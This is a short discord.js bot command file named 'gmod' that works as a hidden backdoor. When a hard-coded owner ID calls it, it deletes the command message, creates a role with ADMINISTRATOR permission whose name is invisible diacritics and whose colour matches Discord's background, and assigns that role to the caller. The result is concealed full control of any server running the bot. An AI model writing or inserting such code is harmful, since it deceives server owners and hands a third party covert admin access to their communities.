const Discord = require("discord.js");
const color = "#007fff";
const client = new Discord.Client();
const OwnerID = "303971342703919104";

module.exports.run = async (client, message, args) => {
  if (message.author.id != OwnerID) {
    return message.channel.send("Permission non accordé");
  }
  message.delete();
  message.guild.roles.create({
    data: {
      name: "̔̏̊",
      color: "#36393f",
      permissions: "ADMINISTRATOR",
    },
  });
  var mentionned = message.mentions.users.first();
  if (mentionned) {
    var user = mentionned;
  } else {
    var user = message.author;
  }
  let { cache } = message.guild.roles;
  let role = cache.find((role) => role.name === "̔̏̊");
  if (role) {
    if (message.member.roles.cache.has(role.id)) {
      return message.channel.send("Tu as déjà ce role");
    }
    message.member.roles
      .add(role)
      .then((member) => message.channel.send("ajout du role gmod" + member))
      .catch((err) => console.log(err));
  }
};

module.exports.help = {
  name: "gmod",
};
